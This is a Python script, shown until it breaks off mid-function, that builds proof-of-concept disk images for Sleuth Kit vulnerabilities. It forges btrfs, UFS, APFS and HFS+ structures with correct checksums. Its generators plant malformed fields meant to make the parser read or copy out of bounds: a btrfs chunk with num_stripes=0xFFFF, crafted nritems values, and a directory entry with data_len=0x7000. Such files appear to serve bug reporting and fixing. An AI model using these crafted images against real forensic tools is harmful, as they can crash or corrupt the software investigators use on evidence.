#!/usr/bin/env python3
"""Generate PoC disk images for sleuthkit vulnerabilities."""

import struct
import os
import subprocess
import tempfile
import shutil

# ── CRC-32C (Castagnoli) ────────────────────────────────────────────────────
def _make_crc32c_table():
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0x82F63B78
            else:
                crc >>= 1
        table.append(crc)
    return table

_CRC32C_TABLE = _make_crc32c_table()

def crc32c(data):
    crc = 0xFFFFFFFF
    for b in data:
        crc = (crc >> 8) ^ _CRC32C_TABLE[(crc ^ b) & 0xFF]
    return crc ^ 0xFFFFFFFF


# ── btrfs helpers ───────────────────────────────────────────────────────────
BTRFS_ENDIAN = '<'  # little-endian
BTRFS_TREE_HEADER_RAWLEN = 101
BTRFS_KEY_RAWLEN = 17
BTRFS_ITEM_RAWLEN = 25
BTRFS_KEY_POINTER_RAWLEN = 33
BTRFS_CSUM_RAWLEN = 32
BTRFS_SUPERBLOCK_RAWLEN = 4096
BTRFS_SUPERBLOCK_MAGIC_OFFSET = 0x40
BTRFS_SUPERBLOCK_MAGIC_VALUE = b'_BHRfS_M'
NODE_SIZE = 4096

# Item types
BTRFS_ITEM_TYPE_INODE_ITEM  = 0x01
BTRFS_ITEM_TYPE_INODE_REF   = 0x0C
BTRFS_ITEM_TYPE_DIR_ITEM    = 0x54
BTRFS_ITEM_TYPE_DIR_INDEX   = 0x60
BTRFS_ITEM_TYPE_ROOT_ITEM   = 0x84
BTRFS_ITEM_TYPE_CHUNK_ITEM  = 0xE4

# Object IDs
BTRFS_OBJID_EXTENT_TREE     = 2
BTRFS_OBJID_CHUNK_TREE      = 3
BTRFS_OBJID_FS_TREE         = 5
BTRFS_FIRST_CHUNK_OBJECTID  = 256  # BTRFS_FIRST_CHUNK_TREE_OBJECTID
BTRFS_ROOT_DIRID            = 256  # root directory inode

# Directory type
BTRFS_S_IFDIR = 0x4000  # directory mode bits

def make_btrfs_key(objectid, item_type, offset):
    """Build a 17-byte btrfs disk key."""
    return struct.pack('<QBQ', objectid, item_type, offset)

def make_btrfs_tree_header(bytenr, owner, nritems, level, fsid=b'\x00'*16, gen=1):
    """Build the 101-byte tree node header."""
    raw = bytearray(BTRFS_TREE_HEADER_RAWLEN)
    # csum[32]: zeros (not validated by TSK unless BTRFS_CHECK_TREENODE_CSUM defined)
    raw[0x20:0x30] = fsid                  # fsid[16]
    struct.pack_into('<Q', raw, 0x30, bytenr)   # logical_address
    # flags[7] at 0x38, backref_rev at 0x3F: zeros
    # chunk_tree_uuid[16] at 0x40: zeros
    struct.pack_into('<Q', raw, 0x50, gen)      # generation
    struct.pack_into('<Q', raw, 0x58, owner)    # parent_tree_id (owner)
    struct.pack_into('<I', raw, 0x60, nritems)  # number_of_items
    raw[0x64] = level
    return bytes(raw)

def make_btrfs_leaf(bytenr, owner, items_data):
    """
    Build a 4096-byte leaf node.
    items_data: list of (key_bytes_17, item_data_bytes)
    Items are placed in order (already sorted by caller).
    Data area grows backward from end.
    """
    nritems = len(items_data)
    header = make_btrfs_tree_header(bytenr, owner, nritems, 0)
    node = bytearray(NODE_SIZE)
    node[:BTRFS_TREE_HEADER_RAWLEN] = header

    # Compute data offsets (items from end of data area going backward)
    data_area_size = NODE_SIZE - BTRFS_TREE_HEADER_RAWLEN  # = 3995
    data_end = data_area_size  # start packing from the end

    # Pack item descriptors and data
    item_descs = []
    for (key_bytes, item_data) in reversed(items_data):
        data_size = len(item_data)
        data_end -= data_size
        item_descs.append((key_bytes, data_end, data_size))

    item_descs.reverse()

    # Write item descriptors to beginning of data area
    for i, (key_bytes, data_off, data_size) in enumerate(item_descs):
        slot = BTRFS_TREE_HEADER_RAWLEN + i * BTRFS_ITEM_RAWLEN
        node[slot:slot+17] = key_bytes
        struct.pack_into('<II', node, slot + 17, data_off, data_size)

    # Write item data to data area
    for (key_bytes, data_off, data_size), (_, item_data) in zip(item_descs, items_data):
        abs_off = BTRFS_TREE_HEADER_RAWLEN + data_off
        node[abs_off:abs_off + data_size] = item_data

    return bytes(node)

def make_btrfs_chunk_item(chunk_size, stripe_len, block_type, num_stripes, stripes):
    """Build a btrfs chunk item (0x30 header + num_stripes*0x20 bytes).
    stripes: list of (devid, offset, uuid_16bytes)
    """
    hdr = struct.pack('<QQQQ', chunk_size, BTRFS_OBJID_CHUNK_TREE, stripe_len, block_type)
    hdr += struct.pack('<IIIHH', 4096, 4096, 4096, num_stripes, 1)  # ioalign/width/sector + num_stripes + sub_stripes
    data = bytearray(hdr)
    for (devid, offset, uuid) in stripes:
        data += struct.pack('<QQ', devid, offset)
        data += uuid
    return bytes(data)

def make_btrfs_root_item(root_dir_objectid, root_node_block_number):
    """Build a minimal btrfs root item (0xF0 bytes)."""
    data = bytearray(0xF0)
    struct.pack_into('<Q', data, 0xA8, root_dir_objectid)
    struct.pack_into('<Q', data, 0xB0, root_node_block_number)
    return bytes(data)

def make_btrfs_inode_item(mode):
    """Build a 160-byte btrfs inode item with given mode."""
    data = bytearray(160)
    struct.pack_into('<I', data, 0x34, mode)
    return bytes(data)

def make_btrfs_dir_index_item(child_objectid=257, name=b'x', data_len=0):
    """Build a btrfs dir index item (0x1E + len(name) + data_len bytes)."""
    # btrfs_disk_key for child: objectid, type=INODE_ITEM, offset=0
    key = make_btrfs_key(child_objectid, BTRFS_ITEM_TYPE_INODE_ITEM, 0)
    hdr = key  # 17 bytes
    hdr += struct.pack('<Q', 0)  # transid: 8 bytes → offset 25 = 0x19
    hdr += struct.pack('<HH', data_len, len(name))  # data_len @ 0x19, name_len @ 0x1B
    hdr += struct.pack('B', 4)  # type = DIR (4)
    return bytes(hdr) + name  # actual data (0 bytes) not included; OOB will happen in memcpy

def compute_btrfs_superblock_crc32c(raw4096):
    """Compute CRC-32C of bytes [32:4096] and return 4-byte LE value."""
    data_to_crc = raw4096[BTRFS_CSUM_RAWLEN:]  # bytes 32..4095
    crc = crc32c(data_to_crc)
    return struct.pack('<I', crc)

def make_btrfs_superblock(
        chunk_tree_root, root_tree_root, total_bytes,
        sys_chunk_array_bytes, dev_total_bytes,
        sectorsize=4096, nodesize=4096, stripesize=4096,
        incompat_flags=0, generation=1):
    """Build a 4096-byte btrfs superblock with valid CRC-32C."""
    raw = bytearray(BTRFS_SUPERBLOCK_RAWLEN)

    # [0x20..0x2F]: uuid (all zeros)
    # [0x30..0x37]: physical_address = 0x10000 (mirror 0 address)
    struct.pack_into('<Q', raw, 0x30, 0x10000)
    # [0x38..0x3F]: flags = 0
    # [0x40..0x47]: magic
    raw[0x40:0x48] = BTRFS_SUPERBLOCK_MAGIC_VALUE
    # [0x48]: generation
    struct.pack_into('<Q', raw, 0x48, generation)
    # [0x50]: root_tree_root
    struct.pack_into('<Q', raw, 0x50, root_tree_root)
    # [0x58]: chunk_tree_root
    struct.pack_into('<Q', raw, 0x58, chunk_tree_root)
    # [0x60..0x6F]: log_root=0, log_root_transid=0
    # [0x70]: total_bytes
    struct.pack_into('<Q', raw, 0x70, total_bytes)
    # [0x78]: bytes_used
    struct.pack_into('<Q', raw, 0x78, total_bytes // 2)
    # [0x80]: root_dir_objectid = 6
    struct.pack_into('<Q', raw, 0x80, 6)
    # [0x88]: num_devices = 1
    struct.pack_into('<Q', raw, 0x88, 1)
    # [0x90]: sectorsize
    struct.pack_into('<I', raw, 0x90, sectorsize)
    # [0x94]: nodesize
    struct.pack_into('<I', raw, 0x94, nodesize)
    # [0x98]: leafsize (deprecated, same as nodesize)
    struct.pack_into('<I', raw, 0x98, nodesize)
    # [0x9C]: stripesize
    struct.pack_into('<I', raw, 0x9C, stripesize)
    # [0xA0]: sys_chunk_array_size (n)
    struct.pack_into('<I', raw, 0xA0, len(sys_chunk_array_bytes))
    # [0xA4]: chunk_root_generation
    struct.pack_into('<Q', raw, 0xA4, 1)
    # [0xAC..0xBB]: compat_flags, compat_ro_flags = 0
    # [0xBC]: incompat_flags
    struct.pack_into('<Q', raw, 0xBC, incompat_flags)
    # [0xC4]: csum_type = 0 (CRC-32C)
    struct.pack_into('<H', raw, 0xC4, 0)
    # [0xC6..0xC8]: root_level, chunk_root_level, log_root_level = 0
    # [0xC9]: dev_item (98 bytes) — set total_bytes
    #   dev_item.devid = 1 @ 0xC9
    struct.pack_into('<Q', raw, 0xC9, 1)
    #   dev_item.total_bytes = dev_total_bytes @ 0xD1
    struct.pack_into('<Q', raw, 0xD1, dev_total_bytes)
    # io_align=4096 @ 0xE9, io_width @ 0xED, sector_size @ 0xF1
    struct.pack_into('<I', raw, 0xE9, 4096)
    struct.pack_into('<I', raw, 0xED, 4096)
    struct.pack_into('<I', raw, 0xF1, sectorsize)
    # [0x12B]: label[256] = zeros
    # [0x22B]: reserved[...] = zeros
    # [0x32B]: sys_chunk_array
    n = len(sys_chunk_array_bytes)
    raw[0x32B:0x32B + n] = sys_chunk_array_bytes
    # [0xB2B]: _unused[1237] = zeros

    # Compute CRC-32C (of bytes [32:4096])
    crc_bytes = compute_btrfs_superblock_crc32c(bytes(raw))
    raw[0:4] = crc_bytes
    # raw[4:32] = zeros (rest of csum field)

    return bytes(raw)


def make_sys_chunk_array(logical_offset, chunk_size, num_stripes=1, stripe_offset=0):
    """Build a sys_chunk_array entry: key(17) + chunk_item(0x30 + num_stripes*0x20)."""
    key = make_btrfs_key(BTRFS_FIRST_CHUNK_OBJECTID, BTRFS_ITEM_TYPE_CHUNK_ITEM, logical_offset)
    chunk = make_btrfs_chunk_item(
        chunk_size=chunk_size,
        stripe_len=65536,
        block_type=1,  # SYSTEM
        num_stripes=num_stripes,
        stripes=[(1, stripe_offset, b'\x00' * 16)] * num_stripes
    )
    return key + chunk


# ── FFS/UFS1 helpers ────────────────────────────────────────────────────────
UFS1_FS_MAGIC = 0x011954
UFS2_FS_MAGIC = 0x19540119
FFS_CG_MAGIC  = 0x090255
UFS1_SBOFF    = 8192

def make_ffs_sb1(
        bsize_b, fsize_b, bsize_frag,
        cg_num, cg_inode_num, cg_frag_num,
        sb_off, gd_off, ino_off, dat_off,
        cg_delta=0, cg_cyc_mask=0,
        fs_fragshift=None, fs_inopb=None,
        frag_num=None):
    """Build a 1376-byte UFS1 superblock.
    Returns bytes of exactly sizeof(ffs_sb1)."""
    # sizeof(ffs_sb1) = 1536 bytes based on our calculation
    raw = bytearray(1536)

    # Helper to write int32 LE at offset
    def w32(off, val):
        struct.pack_into('<i', raw, off, val)

    # f1[8] = 0 (offset 0)
    # sb_off[4] @ 8
    w32(8, sb_off)
    # gd_off[4] @ 12
    w32(12, gd_off)
    # ino_off[4] @ 16
    w32(16, ino_off)
    # dat_off[4] @ 20
    w32(20, dat_off)
    # cg_delta[4] @ 24
    w32(24, cg_delta)
    # cg_cyc_mask[4] @ 28
    w32(28, cg_cyc_mask)
    # wtime[4] @ 32 = 0
    # frag_num[4] @ 36
    if frag_num is None:
        frag_num = cg_num * cg_frag_num
    w32(36, frag_num)
    # data_frag_num[4] @ 40
    w32(40, frag_num - cg_num * 8)
    # cg_num[4] @ 44
    w32(44, cg_num)
    # bsize_b[4] @ 48
    w32(48, bsize_b)
    # fsize_b[4] @ 52
    w32(52, fsize_b)
    # bsize_frag[4] @ 56
    w32(56, bsize_frag)
    # f5[36] @ 60 = zeros (36 bytes)
    # fs_fragshift[4] @ 96
    if fs_fragshift is None:
        import math
        fs_fragshift = int(math.log2(fsize_b)) - 9  # rough estimate
        fs_fragshift = max(0, fs_fragshift)
    w32(96, fs_fragshift)
    # f6[20] @ 100 = zeros
    # fs_inopb[4] @ 120
    if fs_inopb is None:
        fs_inopb = bsize_b // 128  # 128 = sizeof(ffs_inode1)
    w32(120, fs_inopb)
    # f7[20] @ 124 = zeros
    # fs_id[8] @ 144 = zeros
    # cg_saddr[4] @ 152
    w32(152, 0)
    # cg_ssize_b[4] @ 156
    w32(156, 32)
    # fs_cgsize[4] @ 160
    w32(160, bsize_b)
    # f7c[12] @ 164 = zeros
    # fs_ncyl[4] @ 176
    w32(176, cg_num)
    # fs_cpg[4] @ 180
    w32(180, 1)
    # cg_inode_num[4] @ 184
    w32(184, cg_inode_num)
    # cg_frag_num[4] @ 188
    w32(188, cg_frag_num)
    # ffs_csum1 cstotal (16 bytes) @ 192: zeros
    # fs_fmod/clean/ronly/flags @ 208: zeros
    # last_mnt[512] @ 212: zeros
    # f8[648] @ 724: zeros
    # magic[4] @ 1372
    struct.pack_into('<I', raw, 1372, UFS1_FS_MAGIC)
    # f9[160] @ 1376: zeros (padding to 1536)

    return bytes(raw)


def make_ffs_cgd(cg_iusedoff, cg_freeoff, magic=FFS_CG_MAGIC):
    """Build a minimal UFS1 cylinder group descriptor (ffs_cgd).
    cg_iusedoff at offset 92, cg_freeoff at offset 96."""
    raw = bytearray(256)  # much larger than needed, rest is zeros

    # magic[4] @ 4
    struct.pack_into('<I', raw, 4, magic)
    # cg_cgx[4] @ 12 = 0 (group 0)
    # cg_iusedoff[4] @ 92
    struct.pack_into('<i', raw, 92, cg_iusedoff)  # signed
    # cg_freeoff[4] @ 96
    struct.pack_into('<i', raw, 96, cg_freeoff)

    return bytes(raw)


# ── NTFS helpers ────────────────────────────────────────────────────────────
NTFS_SECTOR_SIZE = 512
NTFS_CLUSTER_SIZE = 4096  # 8 sectors

def run_mkfs(cmd, img_path, size_bytes):
    """Create an image file and run mkfs on it."""
    with open(img_path, 'wb') as f:
        f.write(b'\x00' * size_bytes)
    result = subprocess.run(cmd, capture_output=True)
    return result.returncode == 0


# ── XFS helpers ─────────────────────────────────────────────────────────────
XFS_SUPER_MAGIC = 0x58465342  # 'XFSB' big-endian


# ── YAFFS2 helpers ──────────────────────────────────────────────────────────
YAFFS2_CHUNK_SIZE = 2048
YAFFS2_SPARE_SIZE = 64
YAFFS2_PAGE_SIZE  = YAFFS2_CHUNK_SIZE + YAFFS2_SPARE_SIZE

def make_yaffs2_tags(obj_id, chunk_id, n_bytes, ecc=0, seq_num=1):
    """Build 16-byte YAFFS2 packed tags (simplified)."""
    # YAFFS2 tags are packed into the spare area
    # Packed format (from yaffs_packedtags2.h):
    # bits 0-31:  sequenceNumber
    # bits 32-47: objectId (16 bits? actually more)
    # Actually YAFFS2 tags are complex. Use a simplified version.
    tags = bytearray(16)
    struct.pack_into('<I', tags, 0, seq_num)    # sequenceNumber
    struct.pack_into('<I', tags, 4, obj_id)     # objectId
    struct.pack_into('<I', tags, 8, chunk_id)   # chunkId
    struct.pack_into('<I', tags, 12, n_bytes)   # nBytes
    return bytes(tags)

def make_yaffs2_spare(obj_id, chunk_id, n_bytes):
    """Build a 64-byte YAFFS2 spare area."""
    spare = bytearray(64)
    # YAFFS2 spare: first 16 bytes are tags, rest can be zeros (ECC)
    spare[:16] = make_yaffs2_tags(obj_id, chunk_id, n_bytes)
    return bytes(spare)

def make_yaffs2_page(data, obj_id, chunk_id, n_bytes):
    """Build a 2112-byte YAFFS2 page (2048 data + 64 spare)."""
    assert len(data) <= YAFFS2_CHUNK_SIZE
    page_data = data + b'\xff' * (YAFFS2_CHUNK_SIZE - len(data))
    spare = make_yaffs2_spare(obj_id, chunk_id, n_bytes)
    return page_data + spare

def make_yaffs2_obj_hdr(obj_id, parent_id, name, obj_type=1):
    """Build a YAFFS2 object header chunk (placed in chunk 0 of an object).
    obj_type: 1=regular file, 3=directory
    """
    data = bytearray(YAFFS2_CHUNK_SIZE)
    struct.pack_into('<I', data, 0, obj_type)   # type
    struct.pack_into('<I', data, 4, parent_id)  # parentObjectId
    # name: bytes 6..67 (null-terminated, 256 bytes?)
    name_bytes = name.encode('utf-8')[:255]
    data[10:10+len(name_bytes)] = name_bytes
    return bytes(data)


# ── APFS helpers ────────────────────────────────────────────────────────────
APFS_NXSUPERBLOCK_MAGIC = 0x4253584E  # little-endian 'NXSB'
APFS_FS_MAGIC = 0x42535041            # 'APSB'
APFS_BLOCK_SIZE = 4096
APFS_OBJ_TYPE_SUPERBLOCK = 0x0001
APFS_OBJ_TYPE_BTREE_ROOTNODE = 0x0002
APFS_OBJ_TYPE_BTREE_NODE = 0x0003
APFS_OBJ_TYPE_OMAP = 0x000B
APFS_BTNODE_ROOT = 0x0001
APFS_BTNODE_LEAF = 0x0002
APFS_BTNODE_FIXED_KV_SIZE = 0x0004

def apfs_fletcher64(data_block):
    """Compute APFS modified Fletcher-64 checksum for a 4096-byte block.
    The first 8 bytes are the checksum placeholder (excluded from computation).
    Returns 8-byte checksum to be placed at offset 0."""
    words = struct.unpack_from('<' + 'I' * ((len(data_block) - 8) // 4), data_block, 8)
    mod = 0xFFFFFFFF
    sum1 = 0
    sum2 = 0
    for w in words:
        sum1 = (sum1 + w) % mod
        sum2 = (sum2 + sum1) % mod
    ck_low = mod - ((sum1 + sum2) % mod)
    ck_high = mod - ((sum1 + ck_low) % mod)
    return struct.pack('<II', ck_low, ck_high)

def make_apfs_obj_header(oid, xid, obj_type, obj_flags=0x4000, subtype=0):
    """Build a 32-byte APFS object header (without checksum)."""
    hdr = bytearray(32)
    # cksum @ 0x00: filled later
    struct.pack_into('<Q', hdr, 0x08, oid)
    struct.pack_into('<Q', hdr, 0x10, xid)
    struct.pack_into('<HH', hdr, 0x18, obj_type, obj_flags)
    struct.pack_into('<I', hdr, 0x1C, subtype)
    return bytes(hdr)

def make_apfs_block_with_checksum(block_body_4096):
    """Given 4096 bytes with checksum field = 0 at bytes 0-7, compute and fill checksum."""
    raw = bytearray(block_body_4096)
    cksum = apfs_fletcher64(bytes(raw))
    raw[0:8] = cksum
    return bytes(raw)

def make_apfs_nx_superblock(block_size=4096, block_count=1024, omap_oid=2,
                              chkpt_desc_base=4, chkpt_desc_count=1,
                              chkpt_data_base=5, chkpt_data_count=1,
                              spaceman_oid=3, reaper_oid=4):
    """Build a 4096-byte APFS container (NX) superblock block 0."""
    raw = bytearray(APFS_BLOCK_SIZE)
    # Object header @ 0x00 (32 bytes): oid=1, xid=1, type=SUPERBLOCK, flags=PHYSICAL
    hdr = make_apfs_obj_header(oid=1, xid=1, obj_type=APFS_OBJ_TYPE_SUPERBLOCK, obj_flags=0x4000)
    raw[0:32] = hdr

    # NX superblock fields starting @ 0x20
    struct.pack_into('<I', raw, 0x20, APFS_NXSUPERBLOCK_MAGIC)  # magic
    struct.pack_into('<I', raw, 0x24, block_size)                 # block_size
    struct.pack_into('<Q', raw, 0x28, block_count)               # block_count
    # features @ 0x30 = 0
    # readonly_compatible_features @ 0x38 = 0
    # incompatible_features @ 0x40 = 2 (VERSION2)
    struct.pack_into('<Q', raw, 0x40, 2)
    # uuid @ 0x48: zeros
    struct.pack_into('<Q', raw, 0x58, 10)           # next_oid
    struct.pack_into('<Q', raw, 0x60, 2)            # next_xid
    struct.pack_into('<I', raw, 0x68, chkpt_desc_count)    # chkpt_desc_block_count
    struct.pack_into('<I', raw, 0x6C, chkpt_data_count)    # chkpt_data_block_count
    struct.pack_into('<Q', raw, 0x70, chkpt_desc_base)     # chkpt_desc_base_addr
    struct.pack_into('<Q', raw, 0x78, chkpt_data_base)     # chkpt_data_base_addr
    struct.pack_into('<I', raw, 0x80, 0)            # chkpt_desc_next_block
    struct.pack_into('<I', raw, 0x84, 0)            # chkpt_data_next_block
    struct.pack_into('<I', raw, 0x88, 0)            # chkpt_desc_index
    struct.pack_into('<I', raw, 0x8C, 1)            # chkpt_desc_len
    struct.pack_into('<I', raw, 0x90, 0)            # chkpt_data_index
    struct.pack_into('<I', raw, 0x94, 1)            # chkpt_data_len
    struct.pack_into('<Q', raw, 0x98, spaceman_oid) # spaceman_oid
    struct.pack_into('<Q', raw, 0xA0, omap_oid)     # omap_oid
    struct.pack_into('<Q', raw, 0xA8, reaper_oid)   # reaper_oid
    # test_type @ 0xB0 = 0
    struct.pack_into('<I', raw, 0xB4, 1)            # max_fs_count = 1
    # fs_oids[100] @ 0xB8: first fs oid = 0 (no volumes for minimal container)
    # counters[32] @ 0x3D8: zeros
    # the rest: zeros

    raw = make_apfs_block_with_checksum(bytes(raw))
    return raw

APFS_OBJ_TYPE_OMAP = 0x000B  # subtype for container omap btree

def make_apfs_btree_node(oid, xid, key_count, level=0, flags=None, subtype=0x000B):
    """Build a 4096-byte APFS btree node block with key_count set.
    subtype=0x000B (OMAP) is required by APFSObjectBtreeNode constructor.
    """
    if flags is None:
        flags = APFS_BTNODE_ROOT | APFS_BTNODE_LEAF | APFS_BTNODE_FIXED_KV_SIZE
    raw = bytearray(APFS_BLOCK_SIZE)

    # Object header @ 0x00 with correct subtype
    if flags & APFS_BTNODE_ROOT:
        obj_type = APFS_OBJ_TYPE_BTREE_ROOTNODE
    else:
        obj_type = APFS_OBJ_TYPE_BTREE_NODE
    hdr = make_apfs_obj_header(oid=oid, xid=xid, obj_type=obj_type, obj_flags=0x4000,
                                subtype=subtype)
    raw[0:32] = hdr

    # apfs_btree_node @ 0x20
    struct.pack_into('<H', raw, 0x20, flags)        # flags
    struct.pack_into('<H', raw, 0x22, level)        # level
    struct.pack_into('<I', raw, 0x24, key_count)    # key_count ← BUG: 0xFFFF for issue 01
    struct.pack_into('<H', raw, 0x28, 0)            # table_space_offset
    struct.pack_into('<H', raw, 0x2A, 0)            # table_space_length
    struct.pack_into('<H', raw, 0x2C, 0)            # free_space_offset
    struct.pack_into('<H', raw, 0x2E, 0)            # free_space_length

    # apfs_btree_info at end of block (required for root nodes, sizeof=40, at offset 4056)
    if flags & APFS_BTNODE_ROOT:
        struct.pack_into('<I', raw, 4056, 0x00000001)  # flags = APFS_BTREE_UINT64_KEYS
        struct.pack_into('<I', raw, 4060, APFS_BLOCK_SIZE)         # node_size

    raw = make_apfs_block_with_checksum(bytes(raw))
    return raw

def make_apfs_omap(oid, xid, tree_oid):
    """Build a 4096-byte APFS omap block."""
    raw = bytearray(APFS_BLOCK_SIZE)

    hdr = make_apfs_obj_header(oid=oid, xid=xid, obj_type=APFS_OBJ_TYPE_OMAP, obj_flags=0x4000)
    raw[0:32] = hdr

    # apfs_omap @ 0x20
    # flags @ 0x20: 0
    # snapshot_count @ 0x24: 0
    struct.pack_into('<H', raw, 0x28, 2)   # tree_type = BTREE (2)
    struct.pack_into('<H', raw, 0x2A, 0x4000)  # type_flags = PHYSICAL
    # snapshot_tree_type @ 0x2C = 0
    struct.pack_into('<Q', raw, 0x30, tree_oid)    # tree_oid
    # snapshot_tree_oid @ 0x38 = 0
    # most_recent_snap @ 0x40 = 0
    # pending_revert_min/max @ 0x48/0x50 = 0

    raw = make_apfs_block_with_checksum(bytes(raw))
    return raw


# ── HFS+ helpers ────────────────────────────────────────────────────────────
HFS_PLUS_SIG = 0x482B      # 'H+'
HFS_PLUS_VERSION = 4
HFSPLUS_VOLHDR_OFFSET = 1024  # Volume header at byte 1024

def make_hfsplus_vh(total_blocks=10000, block_size=4096,
                     attr_clump_size=0, attr_root_node_block=0):
    """Build a minimal HFS+ volume header (512 bytes at offset 1024)."""
    vh = bytearray(512)
    struct.pack_into('>H', vh, 0, HFS_PLUS_SIG)         # signature
    struct.pack_into('>H', vh, 2, HFS_PLUS_VERSION)     # version
    struct.pack_into('>I', vh, 4, 0)                    # attributes
    # lastMountedVersion @ 8: zeros
    struct.pack_into('>I', vh, 12, 0)   # journalInfoBlock
    struct.pack_into('>I', vh, 16, 0)   # createDate
    struct.pack_into('>I', vh, 20, 0)   # modifyDate
    struct.pack_into('>I', vh, 24, 0)   # backupDate
    struct.pack_into('>I', vh, 28, 0)   # checkedDate
    struct.pack_into('>I', vh, 32, 0)   # fileCount
    struct.pack_into('>I', vh, 36, 0)   # folderCount
    struct.pack_into('>I', vh, 40, block_size)          # blockSize
    struct.pack_into('>I', vh, 44, total_blocks)        # totalBlocks
    struct.pack_into('>I', vh, 48, total_blocks // 2)   # freeBlocks
    # nextAllocation @ 52: 0
    # rsrcClumpSize @ 56: 0
    # dataClumpSize @ 60: 0
    # nextCatalogID @ 64 (HFSCatalogNodeID): 16
    struct.pack_into('>I', vh, 64, 16)
    # writeCount @ 68: 1
    struct.pack_into('>I', vh, 68, 1)
    # encodingsBitmap @ 72: 0
    # Various fork data structures follow...
    # For minimal: just set the allocationFile data so it's at block 1
    # allocationFile @ 112 (HFSPlusForkData)
    # HFSPlusForkData: logicalSize(8), clumpSize(4), totalBlocks(4), extents(8*13=104)
    # attributesFile @ 216
    # We mainly need the header to be recognized

    return bytes(vh)


def make_hfsplus_decmpfs_attr(uncSize, compression_type=3, compressed_data=None):
    """Build a com.apple.decmpfs xattr data for a file.

    compression_type:
      3 = zlib (for issue 07: uncSize overflow)
      4 = noncompressed (for issue 08/12: OOB)
    """
    # decmpfs header: magic(4) + compressionType(4) + uncompressedSize(8) + data
    DECMPFS_MAGIC = 0x636D7066  # 'cmpf'
    hdr = struct.pack('<IIQ', DECMPFS_MAGIC, compression_type, uncSize)
    if compressed_data is None:
        compressed_data = b'\x78\x9c\x03\x00\x00\x00\x00\x01'  # minimal zlib
    return hdr + compressed_data


# ═══════════════════════════════════════════════════════════════════════════
# PoC generators
# ═══════════════════════════════════════════════════════════════════════════

def gen_btrfs_stripe_oob(path):
    """Issue 04: btrfs sys_chunk_array chunk item with num_stripes=0xFFFF."""
    IMG_SIZE = 4 * 1024 * 1024  # 4 MB
    img = bytearray(IMG_SIZE)

    # Build sys_chunk_array with num_stripes=0xFFFF
    key = make_btrfs_key(BTRFS_FIRST_CHUNK_OBJECTID, BTRFS_ITEM_TYPE_CHUNK_ITEM, 0)
    # chunk item header only (0x30 bytes), no actual stripes
    chunk_hdr = struct.pack('<QQQQ', 0x100000, BTRFS_OBJID_CHUNK_TREE, 65536, 1)
    chunk_hdr += struct.pack('<IIIHH', 4096, 4096, 4096, 0xFFFF, 1)  # num_stripes=0xFFFF!
    sys_chunks = key + chunk_hdr

    sb = make_btrfs_superblock(
        chunk_tree_root=0x20000,
        root_tree_root=0x30000,
        total_bytes=IMG_SIZE,
        sys_chunk_array_bytes=sys_chunks,
        dev_total_bytes=IMG_SIZE,
    )

    img[0x10000:0x10000 + len(sb)] = sb
    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_btrfs_zero_items(path, nritems_value=0):
    """Issues 03 and 05: chunk tree node with crafted nritems (0 or 0x10000000)."""
    IMG_SIZE = 4 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    # sys_chunk_array: valid 1:1 mapping for logical 0 → physical 0
    sys_chunks = make_sys_chunk_array(0, IMG_SIZE, num_stripes=1, stripe_offset=0)

    # Chunk tree at 0x20000: leaf with nritems=nritems_value
    # We set nritems to the target value; items array is empty (zeros)
    chunk_tree_hdr = make_btrfs_tree_header(0x20000, BTRFS_OBJID_CHUNK_TREE, nritems_value, 0)
    chunk_tree_node = chunk_tree_hdr + b'\x00' * (NODE_SIZE - BTRFS_TREE_HEADER_RAWLEN)

    sb = make_btrfs_superblock(
        chunk_tree_root=0x20000,
        root_tree_root=0x30000,
        total_bytes=IMG_SIZE,
        sys_chunk_array_bytes=sys_chunks,
        dev_total_bytes=IMG_SIZE,
    )

    img[0x10000:0x10000 + len(sb)] = sb
    img[0x20000:0x20000 + NODE_SIZE] = chunk_tree_node
    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_btrfs_dir_entry_oob(path):
    """Issue 06: btrfs FS tree DIR_INDEX entry with data_len=0x7000."""
    IMG_SIZE = 8 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    # Addresses (logical = physical with 1:1 mapping)
    CHUNK_TREE_ADDR  = 0x20000
    ROOT_TREE_ADDR   = 0x30000
    FS_TREE_ADDR     = 0x40000
    EXT_TREE_ADDR    = 0x50000

    # sys_chunk_array: 1:1 mapping for entire image
    sys_chunks = make_sys_chunk_array(0, IMG_SIZE, num_stripes=1, stripe_offset=0)

    # ── Chunk tree leaf (1 item: CHUNK_ITEM mapping logical 0 → physical 0) ──
    chunk_item = make_btrfs_chunk_item(IMG_SIZE, 65536, 1, 1,
                                        [(1, 0, b'\x00'*16)])
    chunk_items = [(make_btrfs_key(BTRFS_FIRST_CHUNK_OBJECTID, BTRFS_ITEM_TYPE_CHUNK_ITEM, 0),
                    chunk_item)]
    chunk_tree_node = make_btrfs_leaf(CHUNK_TREE_ADDR, BTRFS_OBJID_CHUNK_TREE, chunk_items)

    # ── Root tree leaf (2 items: EXTENT_TREE=2, FS_TREE=5) ──
    ri_ext = make_btrfs_root_item(root_dir_objectid=0, root_node_block_number=EXT_TREE_ADDR)
    ri_fs  = make_btrfs_root_item(root_dir_objectid=BTRFS_ROOT_DIRID,
                                   root_node_block_number=FS_TREE_ADDR)
    root_items = [
        (make_btrfs_key(BTRFS_OBJID_EXTENT_TREE, BTRFS_ITEM_TYPE_ROOT_ITEM, 0), ri_ext),
        (make_btrfs_key(BTRFS_OBJID_FS_TREE,     BTRFS_ITEM_TYPE_ROOT_ITEM, 0), ri_fs),
    ]
    root_tree_node = make_btrfs_leaf(ROOT_TREE_ADDR, 1, root_items)  # owner=1=ROOT_TREE

    # ── FS tree leaf (2 items: INODE_ITEM + DIR_INDEX with crafted data_len) ──
    inode_data = make_btrfs_inode_item(mode=BTRFS_S_IFDIR)  # directory mode
    dir_index_data = make_btrfs_dir_index_item(
        child_objectid=257, name=b'x', data_len=0x7000)  # BUG: data_len=0x7000

    fs_items = [
        (make_btrfs_key(BTRFS_ROOT_DIRID, BTRFS_ITEM_TYPE_INODE_ITEM, 0), inode_data),
        (make_btrfs_key(BTRFS_ROOT_DIRID, BTRFS_ITEM_TYPE_DIR_INDEX, 1), dir_index_data),
    ]
    fs_tree_node = make_btrfs_leaf(FS_TREE_ADDR, BTRFS_OBJID_FS_TREE, fs_items)

    # ── Extent tree leaf (0 items, just a valid node header) ──
